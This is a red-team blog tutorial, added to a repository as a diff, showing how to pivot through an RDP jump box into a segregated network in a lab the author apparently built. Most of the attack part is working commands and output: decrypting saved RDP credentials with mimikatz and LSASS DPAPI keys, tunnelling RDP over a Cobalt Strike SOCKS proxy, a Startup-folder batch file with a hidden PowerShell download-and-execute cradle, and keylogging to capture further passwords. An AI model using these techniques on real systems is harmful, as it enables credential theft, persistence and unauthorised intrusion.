@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">Jumping Network Segregation with RDP</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#assume-breach">Assume Breach</a></li>
+    <li><a href="#credential-manager--dpapi">Credential Manager &amp; DPAPI</a></li>
+    <li><a href="#rdp01">RDP01</a></li>
+    <li><a href="#persistence">Persistence</a></li>
+    <li><a href="#secret">SECRET</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    <h2 id="introduction">Introduction</h2>
+<p>This short post demonstrates how it may be possible to pivot into a segregated/protected network, via an RDP Jump Box.</p>
+<p>This is the network topology I&rsquo;ve built for the scenario:</p>
+<figure>
+    <img src="/images/rdp/network.jpg"/> 
+</figure>
+
+<p>A brief description:</p>
+<ul>
+<li>The LAN is a flat network of workstations and servers.</li>
+<li>Some servers, including the RDP Jump Box, cannot talk out to the Internet.</li>
+<li>Workstations can access the Internet via a proxy.</li>
+<li>The RDP Jump Box is the only host on the LAN that can talk to the &lsquo;Secret Network&rsquo; and is limited to port 3389.</li>
+<li>The two networks are different forests - <code>rasta-lan.local</code> and <code>secret-lan.local</code>.</li>
+<li>LAN is on <code>10.0.0.0/16</code>; SECRET is on <code>172.16.0.0/24</code>.</li>
+</ul>
+<p>The aim of the scenario is for the attacker to open Remote Desktop Connection on their attacking machine (Windows 10) and RDP directly onto the &lsquo;Mission Objective&rsquo; server in the Secret Network.</p>
+<h2 id="assume-breach">Assume Breach</h2>
+<p>We have a beacon as a user called <code>rasta_mouse</code>, who is only a member of <code>Domain Users</code>.  Query the target server to discovery which users/groups are granted RDP access.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; powerpick Get-NetLocalGroup -ComputerName RDP01 -GroupName &#34;Remote Desktop Users&#34;
+
+ComputerName : RDP01
+AccountName  : rasta-lan.local/Jump Box Users
+IsDomain     : True
+IsGroup      : True
+SID          : S-1-5-21-2294392343-2072776990-791666979-1106
+</code></pre></div><p>Who is a member of <code>Jump Box Users</code> ?</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; powerpick Get-NetGroupMember -GroupName &#34;Jump Box Users&#34;
+
+GroupDomain  : rasta-lan.local
+GroupName    : Jump Box Users
+MemberDomain : rasta-lan.local
+MemberName   : rasta_mouse_adm
+MemberSID    : S-1-5-21-2294392343-2072776990-791666979-1107
+IsGroup      : False
+MemberDN     : CN=Rasta Mouse (Admin),CN=Users,DC=rasta-lan,DC=local
+</code></pre></div><p>So <code>rasta_mouse</code> has two separate accounts, which means we need the credentials of <code>rasta_mouse_adm</code> to proceed. I&rsquo;ll explore two possible methods here.</p>
+<h2 id="credential-manager--dpapi">Credential Manager &amp; DPAPI</h2>
+<p>If the user has elected to save the RDP credentials, this is the most fun and elegent way if you have the necessary <code>SeDebugPrivilege</code> to carry it out.</p>
+<p>This is how Windows Credentials look in the Credential Manager GUI.</p>
+<figure>
+    <img src="/images/rdp/cred-manager.jpg"/> 
+</figure>
+
+<p>You can query the same on the command line.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; shell vaultcmd /listcreds:&#34;Windows Credentials&#34; /all
+
+Credentials in vault: Windows Credentials
+
+Credential schema: Windows Domain Password Credential
+Resource: Domain:target=TERMSRV/rdp01
+Identity: LAN\rasta_mouse_adm
+Hidden: No
+Roaming: No
+Property (schema element id,value): (100,2)
+
+</code></pre></div><p>These credentials are stored within the users directory, <code>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force
+
+    Directory: C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a-hs-       02/09/2017     13:37            412 2647629F5AA74CD934ECD2F88D64ECD0
+-a-hs-       30/08/2017     19:28          11204 DFBE70A7E5CC19A398EBF1B96859CE5D
+</code></pre></div><p>Now let&rsquo;s look at <code>C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {6515c6ef-60cd-4563-a3d5-3d70a6bc6992}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000030 - 48
+  szDescription      : Local Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : be072ec0f54a6ceaffd09fe2275d72f9
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : a3579f9e295013432807757d3bcdf82e
+  dwDataLen          : 000000d8 - 216
+  pbData             : 0bad8cb788a364061fa1eff57c3cbc83c8aa198c95537f66f2f973c8fe5e7210626c58423b84b55f604cff2b23165b690ad7fa7ad03d80051cb7c1a0e987f36586ede1bd7ff7e2b9f1d3cbc4b8f1b8557ab1be3402d3bfe39b1682353504ff156615b44ea83aa173c3f7830b65bf9202d823932ca69413fcb8bca1a76893c7cbab7e0ee0bbe9269a8b9f65e88e099334177be15cf977a44b77ba6e829c89303ef4764f5fd661e722c7508ad2e01a41f9cd079fc7ce5a8dba90c94a2314941674ad47567bd9c980548f809fe72ce4895b6a56cb9148c47afb
+  dwSignLen          : 00000014 - 20
+  pbSign             : 43559a2b2e9b11bc4b56828a1d2ece489c9dfd52
+</code></pre></div><p>The noteworthy fields here are <code>pbData</code> and <code>guidMasterKey</code> - a simplistic way to look at it, is that <code>pbData</code> is the data we want to decrypt and <code>guidMasterKey</code> is the key needed to do so.</p>
+<p>There&rsquo;s a good chance <code>LSASS</code> already has this key within its cache - so with <code>SeDebugPrivilege</code> we can elevate and obtain.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; mimikatz !sekurlsa::dpapi
+</code></pre></div><p>Within all this output, we find the GUID and associated <code>MasterKey</code> we were hoping for.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[00000000]
+	 * GUID      :	{6515c6ef-60cd-4563-a3d5-3d70a6bc6992}
+	 * Time      :	02/09/2017 13:37:51
+	 * MasterKey :	95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+	 * sha1(key) :	89f35906909d78c84ba64af38a2bd0d1d96a0726
+</code></pre></div><p>If we were running mimikatz in interactive mode, it would automatically add these keys to our dpapi cache and use them when we try to decrypt the credentials.  But running mimikatz through Cobalt Strike doesn&rsquo;t allow us to retain the same session (at least if you can, I don&rsquo;t know how), so we must take the key and use it manually.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+
+Decrypting Credential:
+ * masterkey     : 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000d2 - 210
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 02/09/2017 12:37:44
+  unkFlagsOrSize : 00000030 - 48
+  Persist        : 00000002 - 2 - local_machine
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:target=TERMSRV/rdp01
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : LAN\rasta_mouse_adm
+  CredentialBlob : Sup3rAw3s0m3Passw0rd!     &lt;--- BOOM!
+  Attributes     : 0
+</code></pre></div><h2 id="rdp01">RDP01</h2>
+<p>Let&rsquo;s use these credentials to RDP into the jump box - remember the aim is to do this directly from our attacking machine.  So, let&rsquo;s first setup a SOCKS Proxy on our current Beacon.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; socks 1337
+[+] started SOCKS4a server on: 1337
+</code></pre></div><ul>
+<li>SSH into your Teamserver and install <code>socat</code> &amp; <code>proxychains</code> if they&rsquo;re not already.</li>
+<li>Modify <code>proxychains.conf</code> to use <code>127.0.0.1</code> on port <code>1337</code>.</li>
+<li>Then run <code>socat</code> with <code>proxychains</code> -&gt; <code>proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389</code>.</li>
+</ul>
+<p>This will allow our Teamserver to listen on <code>3389</code>, any traffic hitting that port will be redirected down the socks proxy to <code>10.0.0.100</code> on port <code>3389</code>.</p>
+<blockquote>
+<p>Remember that there&rsquo;s no authentication on Beacon&rsquo;s SOCKS proxy - so ensure the firewall rules on your Teamserver are sufficient as to not open this up to the whole Internet.</p>
+</blockquote>
+<p>Now we RDP to our Teamserver&rsquo;s IP address, and we should land on that jump box&hellip;</p>
+<figure>
+    <img src="/images/rdp/rdp01.jpg"/> 
+</figure>
+
+<h2 id="persistence">Persistence</h2>
+<p>Now that we have access to this server, let&rsquo;s set up a persistence element so that when the &ldquo;real&rdquo; <code>rasta_mouse_adm</code> connects, we can get an SMB Beacon back.</p>
+<p>Here&rsquo;s a very simplistic example:</p>
+<ul>
+<li>Create a stageless PowerShell SMB Beacon payload.</li>
+<li>Host it on your Teamserver (web delivery) at a <code>/smb</code>.</li>
+<li>Create a <code>Reverse Port Foward</code> on our current beacon -&gt; <code>rportfwd 8080 178.62.56.134 80</code></li>
+<li>Create <code>C:\Users\rasta_mouse_adm\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat</code> with the following content:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">powershell.exe -nop -w hidden -c &#34;iex ((new-object net.webclient).downloadstring(&#39;http://10.0.1.200:8080/smb&#39;))&#34;
+</code></pre></div><ul>
+<li>Log off the RDP session.</li>
+</ul>
+<blockquote>
+<p>If you can elevate on this server and run/migrate into a SYSTEM process, you won&rsquo;t have to rely on maintaining an RDP session to run Beacon.</p>
+</blockquote>
+<p>When the genuine user logs in, we&rsquo;ll see a hit in our weblog.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">09/02 14:19:45 visit from: 178.62.56.134
+	Request: GET /smb
+	page Serves /opt/cobaltstrike/uploads/beacon.ps1
+	null
+</code></pre></div><p>So, let&rsquo;s <code>link</code> to the beacon.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; link 10.0.0.100
+[+] established link to child beacon: 10.0.0.100
+</code></pre></div><figure>
+    <img src="/images/rdp/link.jpg"/> 
+</figure>
+
+<blockquote>
+<p>Note: if the user log&rsquo;s off, we lose our Beacon; if they only disconnect, it stays alive.</p>
+</blockquote>
+<h2 id="secret">SECRET</h2>
+<p>Now we&rsquo;re on the jump box, we need to know how to get into <code>SECRET</code>.</p>
+<p>You can actually keylog everything you need, so let&rsquo;s have a look at that.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; keylogger 1816 x64
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Start menu
+=======
+remo
+
+Remote Desktop Connection
+=======
+172.16.0.10
+
+
+Windows Security
+=======
+SECRET\rasta_mouse[tab]Passw0rd!
+</code></pre></div><ul>
+<li>Stop the curent SOCKS Proxy in Beacon, as well as proxychains/socat on the Teamserver.</li>
+<li>Start a new SOCKS Proxy on the jump box (same port if you like).</li>
+<li>On your Teamserver, run <code>proxychains socat TCP4-LISTEN:3389,fork TCP4:172.16.0.10:3389</code></li>
+</ul>
+<p>As before, RDP to the Teamsever IP and we&rsquo;ll land directly inside <code>SECRET</code>.</p>
+<figure>
+    <img src="/images/rdp/mo1.jpg"/> 
+</figure>
+
+<h2 id="conclusion">Conclusion</h2>
+<!-- raw HTML omitted -->
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/terraform-pt1/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/terraform-pt2/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
